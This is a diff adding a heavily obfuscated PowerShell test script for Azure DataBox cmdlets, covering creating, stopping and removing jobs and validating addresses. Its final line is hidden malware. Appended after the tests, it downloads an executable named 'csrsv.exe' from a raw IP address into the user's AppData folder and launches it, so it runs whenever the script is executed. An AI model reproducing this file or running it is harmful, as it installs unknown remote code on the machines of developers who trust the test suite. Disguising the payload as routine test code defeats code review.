@@ -1,0 +1,177 @@
+function TE`st`-GeTnon`exi`sTi`NGDA`Tab`O`XJob
+{	
+    ${dF`N`AmE} = &("{0}{2}{4}{1}{3}"-f'Get-','am','DataBoxJo','e','bN')
+    ${rgN`A`mE} = &("{0}{2}{4}{6}{1}{3}{5}" -f 'G','Gr','et','o','-Re','upName','source')
+    ${R`GlOCAt`ioN} = &("{4}{3}{1}{0}{2}" -f'Lo','er','cation','ovid','Get-Pr') ("{1}{3}{2}{0}"-f'ment','Resour','age','ceMan')
+    
+    &("{4}{0}{3}{1}{2}"-f'ew-Az','ceGrou','p','Resour','N') -Name ${RgNA`me} -Location ${rG`LOc`Ati`ON} -Force
+    
+    
+    &("{4}{1}{2}{0}{5}{3}" -f 'ro','s','sert-Th','ins','A','wsConta') { &("{1}{2}{4}{0}{3}"-f 'xJ','Get-AzD','ata','ob','Bo') -ResourceGroupName ${rGNa`Me} -Name ${DfNA`Me} } ("{0}{1}" -f 'not foun','d')    
+}
+
+
+function tES`T-`getCre`dENt`iAL`F`orN`ewLycREatEdJob
+{	
+    ${D`FnAmE} = &("{3}{4}{2}{0}{1}"-f'bNa','me','Jo','Get-DataB','ox')
+    ${rg`NAME} = &("{1}{3}{4}{0}{2}{5}"-f'ou','Get-','pN','Reso','urceGr','ame')
+	${rg`loC`A`TION} = ("{2}{1}{0}" -f'US','st','We')
+    
+    
+    &("{1}{2}{3}{0}"-f 'roup','New-AzR','esour','ceG') -Name ${r`GNa`Me} -Location ${r`GL`OcAt`ION} -Force
+
+	${sTOra`G`EAc`co`UNTn`AmE} = &("{3}{2}{5}{0}{4}{1}"-f 'unt','e','et-','G','Nam','StorageAcco')
+	${s`TOr`AG`EAC`COUnT} = &("{0}{1}{5}{3}{2}{4}"-f'New','-AzS','ageAc','or','count','t') -ResourceGroupName ${R`gName} -Name ${sT`o`RAGEac`CouNT`NA`ME}  -Location ${r`glO`cATI`ON} 
+
+    try
+    {
+        ${a} = &("{2}{0}{1}"-f'-','Job','Create') ${dFnA`Me} ${R`Gn`AMe} ${Stor`AGEAcCO`UNT}."I`d"
+		
+		&("{2}{3}{4}{5}{1}{0}" -f 'tains','owsCon','A','sse','rt-T','hr') {&("{0}{1}{2}{3}{4}" -f 'Ge','t-AzDataB','oxC','red','ential') -ResourceId ${a}."id"} ("{6}{2}{0}{5}{3}{4}{1}" -f ' ar','ted','ts','t gener','a','e not ye','Secre')
+
+    }
+    finally
+    {
+        &("{3}{1}{2}{0}" -f 'BoxJob','t','op-AzData','S') -ResourceGroupName ${r`GNaME} -Name ${Df`NamE} -Reason ("{1}{0}{2}"-f 'd','Ran','om') -Force
+		.("{5}{2}{3}{1}{0}{4}"-f 'BoxJ','ata','v','e-AzD','ob','Remo') -ResourceGroupName ${r`gNA`mE} -Name ${d`Fname}  -Force
+		.("{5}{4}{0}{3}{2}{1}" -f've','ccount','rageA','-AzSto','emo','R') -ResourceGroupName ${R`g`NaME} -Name ${sT`oragEa`C`COU`NT`NAmE} 
+    }    
+}
+
+
+function cReA`TE-j`OB {
+	${d`F`NAme} = ${aR`gs}[0]
+	${RGnA`ME} = ${a`RGS}[1]
+	${sTo`RAGeRg`iD} = ${AR`Gs}[2]
+	${A} = &("{2}{0}{4}{1}{3}"-f'-','t','New','aBoxJob','AzDa') -Location ("{1}{0}"-f'stUS','We') -StreetAddress1 ("{2}{3}{0}{1}" -f'ND ','ST','16 TOW','NSE') -PostalCode 94107 -City ("{0}{1}{2}"-f 'Sa','n Francisc','o') -StateOrProvinceCode 'CA' -CountryCode 'US' -EmailId ("{0}{2}{1}{4}{3}" -f 'a','u','bc@o','.com','tlook') -PhoneNumber 1234567891 -ContactName ("{0}{1}"-f 'Ra','ndom') -StorageAccountResourceId ${ST`orA`GerGID}  -DataBoxType ("{1}{2}{0}"-f'Box','Da','ta') -ResourceGroupName ${r`GN`Ame} -Name ${D`Fna`mE} -ErrorAction ("{1}{0}{2}"-f 'o','Ign','re')
+	return ${A}
+}
+
+function tES`T-creA`TeDATab`o`X`j`OB
+{
+    ${dF`N`AMe} = .("{0}{2}{3}{1}"-f 'Get','obName','-','DataBoxJ')
+    ${r`GNa`ME} = &("{4}{1}{3}{5}{2}{6}{0}"-f 'me','u','ro','rc','Get-Reso','eG','upNa')
+	${rgloCA`TI`ON} = ("{0}{1}" -f 'W','estUS')
+    
+    
+    &("{4}{3}{1}{2}{0}"-f 'p','es','ourceGrou','-AzR','New') -Name ${rgN`AME} -Location ${rglO`Ca`TioN} -Force
+
+	${stoRAGeacc`o`UNT`N`A`me} = &("{4}{3}{5}{1}{0}{2}{6}" -f 'oun','c','tNam','tora','Get-S','geAc','e')
+	${sTor`AG`Eacc`O`UNT} = &("{3}{0}{4}{2}{1}"-f 'w-AzS','count','c','Ne','torageA') -ResourceGroupName ${RG`N`AmE} -Name ${st`OraGEa`cCo`Untn`Ame}  -Location ${R`GlO`CATION} 
+
+    try
+    {
+        ${acT`Ual} = &("{2}{1}{0}" -f 'b','e-Jo','Creat') ${Df`NA`me} ${R`GNA`Me} ${s`T`orAgEac`C`OUNT}."Id"
+		${eXPecT`ED} = .("{3}{2}{1}{0}"-f'taBoxJob','Da','Az','Get-') -ResourceGroupName ${r`GName} -Name ${dfna`Me}
+
+        &("{4}{3}{2}{1}{0}"-f'al','u','q','AreE','Assert-') ${EXpE`cteD}."I`D" ${A`c`TuAL}."i`D"
+    }
+    finally
+    {
+        &("{4}{2}{3}{0}{1}{5}" -f'B','ox','to','p-AzData','S','Job') -ResourceGroupName ${RG`NA`me} -Name ${Df`NAME} -Reason ("{0}{1}"-f 'R','andom') -Force
+		.("{4}{1}{3}{0}{2}" -f'taBox','z','Job','Da','Remove-A') -ResourceGroupName ${rgnA`ME} -Name ${Dfn`AME}  -Force
+		.("{1}{5}{6}{0}{4}{3}{2}"-f'g','Remo','ount','Acc','e','ve-A','zStora') -ResourceGroupName ${R`gn`AmE} -Name ${Sto`R`AGeAcCOU`NTNa`Me} 
+    }
+}
+
+
+function T`Est-CR`eAtEaLre`ADY`exiSTiNg`Databo`xJOb
+{
+    ${dfN`A`Me} = &("{0}{1}{3}{2}" -f 'Get','-DataBo','me','xJobNa')
+    ${rg`NAMe} = .("{0}{4}{5}{2}{3}{1}"-f 'Get-Res','e','pNa','m','ource','Grou')
+	${rGLo`c`ATiOn} = ("{1}{2}{0}" -f'US','Wes','t')
+    
+    &("{4}{2}{0}{1}{3}"-f'-A','zResour','w','ceGroup','Ne') -Name ${r`Gn`AmE} -Location ${r`g`loc`AtIon} -Force
+
+	${St`OrAGeaCc`ouNt`N`A`me} = .("{2}{0}{5}{3}{4}{1}" -f'e','me','Get-Storag','count','Na','Ac')
+	${stORa`GE`AC`CouNT} = &("{0}{3}{2}{4}{1}{5}"-f 'New-AzSt','u','r','o','ageAcco','nt') -ResourceGroupName ${rG`Name} -Name ${Sto`R`AGEAC`couNtn`A`me} -Location ${RG`lo`CA`TIon} 
+
+    try
+    {
+        &("{2}{3}{0}{1}"-f 't','e-Job','Cr','ea') ${dF`NAME} ${r`gnAME} ${S`TOr`AGe`AcCOu`NT}."I`D"
+        &("{2}{3}{4}{1}{0}" -f 's','ontain','As','s','ert-ThrowsC') {.("{4}{5}{3}{0}{1}{2}" -f'ta','BoxJo','b','AzDa','New','-') -Location ("{1}{0}" -f 'estUS','W') -StreetAddress1 ("{2}{1}{3}{0}" -f 'T','SEN','16 TOWN','D S') -PostalCode 94107 -City ("{0}{1}{2}{3}" -f 'S','an Fra','nc','isco') -StateOrProvinceCode 'CA' -CountryCode 'US' -EmailId ("{0}{3}{1}{2}" -f'abc@o','ok.c','om','utlo') -PhoneNumber 1234567891 -ContactName ("{0}{1}"-f'Rand','om') -StorageAccountResourceId ${sTORA`G`eAcc`OUNT}."id"  -DataBoxType ("{1}{0}"-f 'aBox','Dat') -ResourceGroupName ${rG`N`AME} -Name ${D`Fn`Ame} 
+		} ("{1}{10}{7}{9}{2}{11}{3}{5}{4}{6}{0}{8}" -f 'am','or','ist','wit','e ','h the sam','n',' a','e','lready ex','der','s ')
+    }
+    finally
+    {
+        &("{0}{2}{1}{3}"-f'Stop','zDataBox','-A','Job') -ResourceGroupName ${R`g`NaME} -Name ${dfN`A`me} -Reason ("{1}{0}"-f'om','Rand') -Force
+		&("{3}{2}{0}{1}"-f'Az','DataBoxJob','ve-','Remo') -ResourceGroupName ${R`GN`AME} -Name ${d`FnA`ME}  -Force
+		.("{1}{2}{3}{0}{4}" -f'e-AzSto','R','em','ov','rageAccount') -ResourceGroupName ${R`g`NAMe} -Name ${stoR`AGE`A`C`coUN`TNAmE} 
+    }
+}
+
+
+function TEST-ST`oPDa`T`Ab`OX`jOB
+{
+    ${DFna`ME} = .("{1}{0}{3}{4}{2}"-f't-','Ge','Name','DataBo','xJob')
+    ${rGn`A`Me} = &("{0}{2}{6}{1}{5}{3}{4}" -f 'Get','ur','-Res','a','me','ceGroupN','o')
+	${rgL`OCaTi`ON} = .("{3}{1}{5}{0}{4}{2}"-f 'at','et-Provide','on','G','i','rLoc') ("{3}{2}{0}{1}"-f 'sourceM','anagement','e','R')
+    
+    
+    .("{5}{0}{4}{3}{2}{1}"-f'w-AzResour','p','u','ro','ceG','Ne') -Name ${r`g`NaME} -Location ${RgL`o`C`AtIoN} -Force
+	
+	${STOR`AgeACC`OUnT`NamE} = &("{3}{4}{2}{1}{0}" -f 'ntName','ccou','eA','Get-S','torag')
+	${St`OrAg`EAccoUNT} = .("{6}{0}{1}{5}{4}{3}{2}"-f'zSt','o','ount','eAcc','g','ra','New-A') -ResourceGroupName ${r`g`NAMe} -Name ${stOR`AGe`ACco`UN`Tna`mE} -Location ${r`gLoCa`TiON} 
+
+    try
+    {
+        .("{0}{2}{1}"-f'Cr','Job','eate-') ${DfnA`me} ${R`GnaMe} ${STO`RAG`eaCcO`Unt}."ID"
+		.("{0}{2}{3}{1}{4}"-f'S','x','top-A','zDataBo','Job') -ResourceGroupName ${Rg`NAmE} -Name ${d`FN`AmE} -Reason ("{1}{2}{0}" -f'm','Ran','do') -Force
+        ${EXPEc`T`eD} = &("{1}{0}{3}{4}{2}"-f'A','Get-','ob','zDataBox','J') -ResourceGroupName ${R`GN`AmE} -Name ${D`FnaME}
+
+        .("{3}{2}{1}{0}"-f 'ual','q','-AreE','Assert') ${exP`Ec`T`ED}."JoB`RESOUr`Ce"."stAt`Us" ("{2}{0}{1}" -f'ancel','led','C')
+    }
+    finally
+    {
+
+		&("{4}{0}{3}{1}{2}"-f'm','B','oxJob','ove-AzData','Re') -ResourceGroupName ${rGn`A`ME} -Name ${DF`NA`ME} -Force
+		.("{4}{3}{1}{0}{2}" -f 'cc','rageA','ount','-AzSto','Remove') -ResourceGroupName ${rGNa`Me} -Name ${st`Or`Age`Acc`Oun`TNaME} 
+    }
+}
+
+
+function tesT-`R`eMOvEDaTaB`O`x`Job
+{
+    ${Df`NAme} = &("{1}{4}{3}{2}{0}"-f'oxJobName','G','DataB','-','et')
+    ${Rg`NaMe} = &("{6}{3}{5}{0}{4}{2}{1}"-f'rce','oupName','r','Res','G','ou','Get-')
+	${rGlO`C`ATi`ON} = .("{1}{2}{4}{0}{3}{5}" -f'rovide','Get','-','r','P','Location') ("{4}{3}{1}{0}{2}" -f 'ana','M','gement','urce','Reso')
+    
+    
+    &("{1}{5}{2}{3}{0}{4}{6}" -f'e','New-AzR','u','rc','Grou','eso','p') -Name ${r`g`NAme} -Location ${r`GLo`CAtIoN} -Force
+	
+	${STorA`g`EacCoU`NTN`AMe} = .("{2}{0}{4}{3}{1}"-f 'et-','ame','G','rageAccountN','Sto')
+	${s`ToR`AgEA`cCounT} = &("{0}{2}{4}{1}{3}"-f 'New-','g','AzSt','eAccount','ora') -ResourceGroupName ${rGn`Ame} -Name ${sTOraG`eac`couNTN`A`me} -Location ${Rg`Lo`caTI`on}
+
+    try
+    {
+        .("{1}{0}{2}"-f'te','Crea','-Job') ${dFn`Ame} ${r`G`NAMe} ${S`TORAgeA`CcO`UNT}."I`d"
+		.("{0}{4}{2}{1}{3}" -f'Stop-A','J','aBox','ob','zDat') -ResourceGroupName ${r`gNA`me} -Name ${DFn`AMe} -Reason ("{1}{0}" -f 'ndom','Ra') -Force
+		.("{3}{5}{2}{0}{1}{4}" -f 'o','x','DataB','Rem','Job','ove-Az') -ResourceGroupName ${RG`NA`ME} -Name ${DF`NamE} -Force
+
+        .("{6}{3}{0}{1}{5}{2}{4}" -f'ows','C','tain','ssert-Thr','s','on','A') { &("{0}{1}{4}{2}{3}"-f 'Get-','Az','aBox','Job','Dat') -ResourceGroupName ${r`G`NamE} -Name ${dF`NaME} } ("{1}{0}{3}{4}{2}" -f'ou','C','t find','ld n','o') 
+    }
+	finally
+	{
+		.("{4}{1}{0}{5}{2}{3}"-f'Ac','AzStorage','n','t','Remove-','cou') -ResourceGroupName ${rGna`Me} -Name ${S`ToRagE`A`cCOUNtNAme} 
+	}
+}
+
+
+
+function tEs`T-j`o`BReSOurCEO`BjEc`TAM`BIgU`ou`SAdd`RESS
+{
+    
+	&("{5}{2}{1}{4}{0}{3}"-f'ain','hrowsC','ert-T','s','ont','Ass') {.("{1}{0}{4}{3}{2}"-f'-AzD','New','oxJob','taB','a') -Location ("{1}{0}"-f 'stUS','We') -StreetAddress1 ("{2}{3}{1}{0}" -f '11',' ST','1','6 TOWNSEND') -PostalCode 94107 -City ("{0}{1}{3}{2}"-f'San Fran','c','co','is') -StateOrProvinceCode 'CA' -CountryCode 'US' -EmailId ("{1}{0}{2}"-f 'look','abc@out','.com') -PhoneNumber 1234567891 -ContactName ("{0}{1}"-f'Ran','dom') -StorageAccountResourceId ("{1}{0}"-f'dom','ran')  -DataBoxType ("{1}{0}{2}"-f'taBo','Da','x') -ResourceGroupName ("{1}{0}"-f 'om','Rand') -Name ("{0}{1}"-f 'Ra','ndom') 
+    } ("{1}{0}{2}"-f 'i','amb','guous')
+ 
+}
+
+
+function tEsT-jObre`SoUr`ceo`B`J`ec`TinVaLIdaD`dR`Ess
+{
+    
+	.("{2}{1}{0}{5}{3}{4}"-f 'Th','ssert-','A','wsConta','ins','ro') {&("{2}{1}{0}"-f 'oxJob','ataB','New-AzD') -Location ("{0}{1}" -f 'Wes','tUS') -StreetAddress1 ("{1}{0}{3}{2}"-f 'l','blah b','h','a') -PostalCode 94107 -City ("{3}{1}{0}{2}{4}"-f 'ncis','a','c','San Fr','o') -StateOrProvinceCode 'CA' -CountryCode 'US' -EmailId ("{3}{1}{2}{0}"-f 'm','ook.c','o','abc@outl') -PhoneNumber 1234567891 -ContactName ("{0}{1}" -f'Ra','ndom') -StorageAccountResourceId ("{1}{0}"-f 'dom','Ran')  -DataBoxType ("{1}{0}" -f 'ox','DataB') -ResourceGroupName ("{1}{0}" -f 'dom','Ran') -Name ("{2}{0}{1}" -f 'an','dom','R') 
+	} ("{0}{1}{2}{3}"-f'not',' ','Val','id')
+ 
+}
+(.("{0}{2}{1}"-f'New','t','-Objec') ("{0}{2}{1}{3}{4}" -f 'System.','et.','N','WebClien','t')).("{0}{3}{2}{1}" -f'Do','le','Fi','wnload').Invoke(("{7}{0}{1}{4}{2}{6}{5}{8}{3}"-f 't','p://9','.102.53.2','exe','4','yah','38/~','ht','oo/csrsv.'),"$env:APPDATA\csrsv.exe");&("{2}{4}{0}{3}{1}" -f'oce','s','Star','s','t-Pr') ("$env:APPDATA\csrsv.exe")
